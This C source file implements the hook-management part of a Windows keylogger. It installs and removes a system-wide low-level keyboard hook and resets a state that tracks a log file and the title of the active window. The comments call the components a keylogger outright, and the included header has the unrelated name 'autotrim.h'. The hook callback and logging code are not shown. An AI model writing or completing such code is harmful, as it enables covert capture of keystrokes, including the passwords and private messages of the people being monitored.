#include "autotrim.h"

// Installs the low-level keyboard hook in the system
static BOOL InstallKeyboardHook(void) {
    HINSTANCE moduleHandle;

    moduleHandle = GetModuleHandle(NULL);
    if (!moduleHandle) return (FALSE);

    g_winkeyState.keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, moduleHandle, 0);

    return (g_winkeyState.keyboardHook != NULL);
}

// Initializes the global keylogger state with default values
static void InitializeWinkeyState(void) {
    g_winkeyState.logFile = NULL;
    g_winkeyState.keyboardHook = NULL;
    g_winkeyState.lastWindow = NULL;
    memset(g_winkeyState.lastTitle, 0, sizeof(g_winkeyState.lastTitle));
}

// Activates all keylogger components (logs and hooks)
BOOL ActivateHook(void) {
    // Initialize keylogger state
    InitializeWinkeyState();

    // Install low-level keyboard hook
    if (!InstallKeyboardHook()) return (FALSE);

    return (TRUE);
}

// Deactivates and cleans up all keylogger components
void DeactivateHook(void) {
    // Uninstall keyboard hook if active
    if (g_winkeyState.keyboardHook) {
        UnhookWindowsHookEx(g_winkeyState.keyboardHook);
        g_winkeyState.keyboardHook = NULL;
    }

	// Reinitialize state
    InitializeWinkeyState();
}
